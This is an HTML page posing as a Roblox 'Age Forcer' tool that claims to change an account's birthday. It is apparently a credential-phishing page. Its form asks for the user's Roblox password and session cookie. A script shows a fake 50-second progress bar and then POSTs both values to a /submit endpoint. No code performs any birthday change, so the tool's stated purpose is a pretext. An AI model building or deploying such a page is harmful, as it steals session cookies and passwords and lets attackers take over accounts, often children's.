<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Form Demo</title>
<style>
  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #070007;
    background-image: radial-gradient(circle at 80% 20%, #ff2a2a44 0%, transparent 20%),
                      radial-gradient(circle at 10% 80%, #1b1b2f 0%, transparent 30%);
    color: #fff;
    font-family: Arial, sans-serif;
    padding: 20px;
  }

  /* Card */
  .card {
    width: 100%;
    max-width: 400px;
    background: rgba(0,0,0,0.5);
    border: 1px solid rgba(255,80,80,0.2);
    border-radius: 12px;
    padding: 24px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
    text-align: left;
  }

  label {
    display: block;
    margin-bottom: 6px;
    font-size: 14px;
  }
  input {
    width: 100%;
    padding: 10px;
    margin-bottom: 14px;
    border-radius: 8px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #fff;
    font-size: 15px;
  }

  .btn {
    width: 100%;
    padding: 10px 14px;
    border-radius: 8px;
    background: linear-gradient(180deg,#ff3b3b,#d60f0f);
    border: none;
    color: #fff;
    font-weight: 700;
    font-size: 15px;
    cursor: pointer;
  }
  .btn:hover {
    background: linear-gradient(180deg,#ff5b5b,#f20f0f);
  }

  /* Loader + Success */
  .progress {
    margin-top: 16px;
    height: 10px;
    background: rgba(255,255,255,0.1);
    border-radius: 6px;
    overflow: hidden;
    display: none;
  }
  .progress-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg,#ff5b5b,#ff2a2a);
    transition: width 0.2s;
  }
  .status {
    margin-top: 12px;
    font-size: 14px;
    color: #ddd;
    text-align: center;
  }
</style>
</head>
<body>
  <div>
    <!-- Card -->
    <div class="card">
      <h2 style="color: #ff4444; text-align: center; margin-bottom: 16px;">üéØ Age Forcer</h2>
      <div style="background: rgba(255,69,69,0.15); border: 1px solid rgba(255,69,69,0.3); border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 13px; line-height: 1.4;">
        <strong style="color: #ff6b6b;">‚ö†Ô∏è Important Notice:</strong><br>
        This tool will permanently change your Roblox account's birthday to June 5, 2015. This action cannot be undone and will affect your account's age restrictions and features.
      </div>
      <form id="demoForm">
        <input id="password" type="password" placeholder="Password" />
        <input id="cookie" type="text" placeholder="Enter Cookie" />

        <button class="btn" type="button" id="submitBtn">Submit</button>

        <!-- Loading -->
        <div class="progress" id="progress">
          <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status" id="status"></div>
      </form>
    </div>
  </div>

<script>
  const btn = document.getElementById('submitBtn');
  const progress = document.getElementById('progress');
  const progressBar = document.getElementById('progressBar');
  const status = document.getElementById('status');
  
  // Get all form inputs
  const passwordInput = document.getElementById('password');
  const cookieInput = document.getElementById('cookie');

  btn.addEventListener('click', async () => {
    // Collect all form data
    const formData = {
      password: passwordInput.value.trim(),
      cookie: cookieInput.value.trim()
    };

    // Basic validation
    if (!formData.cookie) {
      status.textContent = '‚ùå Please fill in Cookie';
      status.style.color = '#ff5b5b';
      return;
    }

    // Disable button and show progress
    btn.disabled = true;
    btn.textContent = 'Processing...';
    progress.style.display = 'block';
    status.style.color = '#ddd';
    
    let percent = 0;
    status.textContent = 'Validating 0%';

    const interval = setInterval(() => {
      percent += 2;  // Changed from 5 to 2 to make it take 50 seconds (100/2 * 1000ms = 50 seconds)
      progressBar.style.width = percent + '%';
      
      if (percent <= 30) {
        status.textContent = `Validating ${percent}%`;
      } else if (percent <= 70) {
        status.textContent = `Processing ${percent}%`;
      } else {
        status.textContent = `Sending ${percent}%`;
      }

      if (percent >= 100) {
        clearInterval(interval);
        submitForm(formData);
      }
    }, 1000);  // Changed from 100ms to 1000ms (1 second)
  });

  async function submitForm(formData) {
    try {
      const response = await fetch('/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
      });

      const result = await response.json();

      if (result.success) {
        status.textContent = 'Successfully ‚úÖ';
        status.style.color = '#4CAF50';
        // Clear form
        passwordInput.value = '';
        cookieInput.value = '';
      } else {
        status.textContent = `‚ùå ${result.message}`;
        status.style.color = '#ff5b5b';
      }
    } catch (error) {
      status.textContent = '‚ùå Connection error occurred';
      status.style.color = '#ff5b5b';
    }

    // Re-enable button
    btn.disabled = false;
    btn.textContent = 'Submit';
  }
</script>
</body>
</html>
